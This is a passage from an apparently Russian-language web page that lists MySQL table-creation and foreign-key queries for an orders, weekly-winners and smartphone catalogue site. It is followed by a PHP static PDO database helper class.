	ON DELETE CASCADE
	ON UPDATE CASCADE;
ALTER TABLE `WinnersWeekOrder`
	ADD CONSTRAINT `WinnersWeek (WinnersWeekOrder)`
	FOREIGN KEY (`IdWinnersWeek`)
	REFERENCES `WinnersWeek` (`id`)
	ON DELETE CASCADE
	ON UPDATE CASCADE;
			</pre>
		</div>

		<div id="title_15" class="hide" style="font-weight:bold">Выполнение запроса...</div>
		<div id="index_15" class="hideIndex">16</div>
		<div id="query_15" class="hide">
			<pre>

ALTER TABLE `Order`
	ADD CONSTRAINT `TypeOrder (Order)`
	FOREIGN KEY (`TypeId`)
	REFERENCES `TypeOrder` (`id`)
	ON DELETE CASCADE
	ON UPDATE CASCADE;
			</pre>
		</div>

		<div id="title_14" class="hide" style="font-weight:bold">Выполнение запроса...</div>
		<div id="index_14" class="hideIndex">15</div>
		<div id="query_14" class="hide">
			<pre>

CREATE TABLE `SmartphonesParameters`
(
	`id` INT UNSIGNED NOT NULL AUTO_INCREMENT,
	`IdParameter` INT UNSIGNED NOT NULL,
	`IdSmartphone` INT UNSIGNED NOT NULL,
	`Text` VARCHAR(255) NOT NULL,
	PRIMARY KEY (`id` ASC)
)
ENGINE = InnoDB;
			</pre>
		</div>

		<div id="title_13" class="hide" style="font-weight:bold">Выполнение запроса...</div>
		<div id="index_13" class="hideIndex">14</div>
		<div id="query_13" class="hide">
			<pre>

DROP TABLE IF EXISTS `SmartphonesParameters`;
			</pre>
		</div>

		<div id="title_12" class="hide" style="font-weight:bold">Выполнение запроса...</div>
		<div id="index_12" class="hideIndex">13</div>
		<div id="query_12" class="hide">
			<pre>

CREATE TABLE `Parameters`
(
	`id` INT UNSIGNED NOT NULL AUTO_INCREMENT,
	`Title` VARCHAR(255),
	`Image`  VARCHAR(255) CHARACTER SET 'utf8' COLLATE 'utf8_bin' NOT NULL,
	PRIMARY KEY (`id` ASC)
)
ENGINE = InnoDB;
			</pre>
		</div>

		<div id="title_11" class="hide" style="font-weight:bold">Выполнение запроса...</div>
		<div id="index_11" class="hideIndex">12</div>
		<div id="query_11" class="hide">
			<pre>

DROP TABLE IF EXISTS `Parameters`;
			</pre>
		</div>

		<div id="title_10" class="hide" style="font-weight:bold">Выполнение запроса...</div>
		<div id="index_10" class="hideIndex">11</div>
		<div id="query_10" class="hide">
			<pre>

CREATE TABLE `Smartphones`
(
	`id` INT UNSIGNED NOT NULL AUTO_INCREMENT,
	`Title` VARCHAR(255) NOT NULL,
	`Image`  VARCHAR(255) CHARACTER SET 'utf8' COLLATE 'utf8_bin' NOT NULL,
	`FirstPay` VARCHAR(255) NOT NULL,
	`UrlShop` VARCHAR(255) NOT NULL,
	PRIMARY KEY (`id` ASC)
)
ENGINE = InnoDB;
			</pre>
		</div>

		<div id="title_9" class="hide" style="font-weight:bold">Выполнение запроса...</div>
		<div id="index_9" class="hideIndex">10</div>
		<div id="query_9" class="hide">
			<pre>

DROP TABLE IF EXISTS `Smartphones`;
			</pre>
		</div>

		<div id="title_8" class="hide" style="font-weight:bold">Выполнение запроса...</div>
		<div id="index_8" class="hideIndex">9</div>
		<div id="query_8" class="hide">
			<pre>

CREATE TABLE `WinnersWeekOrder`
(
	`id` INT UNSIGNED NOT NULL AUTO_INCREMENT,
	`IdWinnersWeek` INT UNSIGNED NOT NULL,
	`IdOrder` INT UNSIGNED NOT NULL,
	PRIMARY KEY (`id` ASC)
)
ENGINE = InnoDB;
			</pre>
		</div>

		<div id="title_7" class="hide" style="font-weight:bold">Выполнение запроса...</div>
		<div id="index_7" class="hideIndex">8</div>
		<div id="query_7" class="hide">
			<pre>

DROP TABLE IF EXISTS `WinnersWeekOrder`;
			</pre>
		</div>

		<div id="title_6" class="hide" style="font-weight:bold">Выполнение запроса...</div>
		<div id="index_6" class="hideIndex">7</div>
		<div id="query_6" class="hide">
			<pre>

CREATE TABLE `WinnersWeek`
(
	`id` INT UNSIGNED NOT NULL AUTO_INCREMENT,
	`Title` VARCHAR(255) NOT NULL,
	`Active` TINYINT UNSIGNED DEFAULT '1',
	`Created` TIMESTAMP NOT NULL,
	PRIMARY KEY (`id` ASC)
)
ENGINE = InnoDB;
			</pre>
		</div>

		<div id="title_5" class="hide" style="font-weight:bold">Выполнение запроса...</div>
		<div id="index_5" class="hideIndex">6</div>
		<div id="query_5" class="hide">
			<pre>

DROP TABLE IF EXISTS `WinnersWeek`;
			</pre>
		</div>

		<div id="title_4" class="hide" style="font-weight:bold">Выполнение запроса...</div>
		<div id="index_4" class="hideIndex">5</div>
		<div id="query_4" class="hide">
			<pre>

CREATE TABLE `Order`
(
	`id` INT UNSIGNED NOT NULL AUTO_INCREMENT,
	`Text` VARCHAR(70) NOT NULL,
	`Image`  VARCHAR(255) CHARACTER SET 'utf8' COLLATE 'utf8_bin',
	`Social` VARCHAR(255),
	`Phone` VARCHAR(55),
	`Created` TIMESTAMP NOT NULL,
	`TypeId` INT UNSIGNED NOT NULL,
	PRIMARY KEY (`id` ASC)
)
ENGINE = InnoDB;
			</pre>
		</div>

		<div id="title_3" class="hide" style="font-weight:bold">Выполнение запроса...</div>
		<div id="index_3" class="hideIndex">4</div>
		<div id="query_3" class="hide">
			<pre>

DROP TABLE IF EXISTS `Order`;
			</pre>
		</div>

		<div id="title_2" class="hide" style="font-weight:bold">Выполнение запроса...</div>
		<div id="index_2" class="hideIndex">3</div>
		<div id="query_2" class="hide">
			<pre>

CREATE TABLE `TypeOrder`
(
	`id` INT UNSIGNED NOT NULL AUTO_INCREMENT,
	`Title` VARCHAR(255) NOT NULL,
	PRIMARY KEY (`id` ASC)
)
ENGINE = InnoDB;
			</pre>
		</div>

		<div id="title_1" class="hide" style="font-weight:bold">Выполнение запроса...</div>
		<div id="index_1" class="hideIndex">2</div>
		<div id="query_1" class="hide">
			<pre>

DROP TABLE IF EXISTS `TypeOrder`;
			</pre>
		</div>

		<div id="title_0" class="hide" style="font-weight:bold">Выполнение запроса...</div>
		<div id="index_0" class="hideIndex">1</div>
		<div id="query_0" class="hide">
			<pre>
ALTER DATABASE ... CHARACTER SET utf8 COLLATE utf8_general_ci;
			</pre>
		</div>
    </div>
</div>
</body>
</html>



<?php
class DB{
	static $_dataBaseHost = "";
	static $_dataBaseName = "";
	static $_dataBaseUser = "";
	static $_dataBasePassword = "";
	static $_charset = "utf8";

	static $_filesDir = "uploads";
	static $_status = true;
	static $_count = 0;
	static $_lastInsertId = false;
	static $_connection = null;
	static function createDirForFiles(){
		self::$_filesDir = trim(self::$_filesDir,"/");
		$testString = str_replace($_SERVER["DOCUMENT_ROOT"], "", $_SERVER["SCRIPT_FILENAME"]);
		$testString = explode("/", trim($testString,"/"));
		$uploadLocation = self::$_filesDir;
		for($i=count($testString)-1;$i>0;$i--)
			$uploadLocation = "../".$uploadLocation;
		if(!is_dir($uploadLocation)){
			$dirs = explode("/", $uploadLocation);
			$directory = "";
			foreach ($dirs as $value) {
				$directory .= "$value/";
				if($value==".."){
					if(!is_dir($directory)){
						return array("Не существует каталог (\"$directory\")");
					}
					continue;
				}
				if(!is_dir($directory)){
					if(!mkdir($directory, 0777, true)){
						return array("Ошибка при создании каталога (\"$directory\")");
					}
				}
			}
			return true;
		}else{
			return true;
		}
	}
	static function closeConnection(){
		self::$_connection = null;
	}
	static function setParams($host,$name,$user,$pass){
		self::$_dataBaseHost = $host;
		self::$_dataBaseName = $name;
		self::$_dataBaseUser = $user;
		self::$_dataBasePassword = $pass;
	}
	static function query($sql,$closeConnectionAfterQuery=false){
		self::$_status = true;
		self::$_lastInsertId = false;
		self::$_count = 0;
		$connectionStatus = self::createConnection();
		if($connectionStatus!==true){
			return false;
		}
		$result = null;
		try{
			$result = self::$_connection->prepare($sql);
		}catch(PDOException $e){
			self::$_status = array("Error in query preparing.",$e->getMessage());
			return false;
		}
		try{
			$result->execute();
		}catch(PDOException $e){
			self::$_status = array("Error in query execution.",$e->getMessage());
			return false;
		}
		self::$_count = $result->rowCount();
		$pattern = "/^INSERT\s+/i";
		if(preg_match($pattern,$sql)){
			self::$_lastInsertId = $this->_connection->lastInsertId();
		}
		if($result->columnCount()==0)
			return array();
		$resultArray = $result->fetchAll();
		if($closeConnectionAfterQuery==true)
			self::closeConnection();
		return $resultArray;
	}
	static private function createConnection(){
		if(self::$_connection==null){
			try{
				self::$_connection = new PDO('mysql:host='.self::$_dataBaseHost.';dbname='.self::$_dataBaseName.';charset='.self::$_charset, self::$_dataBaseUser, self::$_dataBasePassword);
				self::$_connection->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
			}catch(PDOException $e){
				self::$_connection = null;
				self::$_status = array("Can't connect to data base.",$e->getMessage());
				return false;
			}
		}
		return true;
	}
}
?>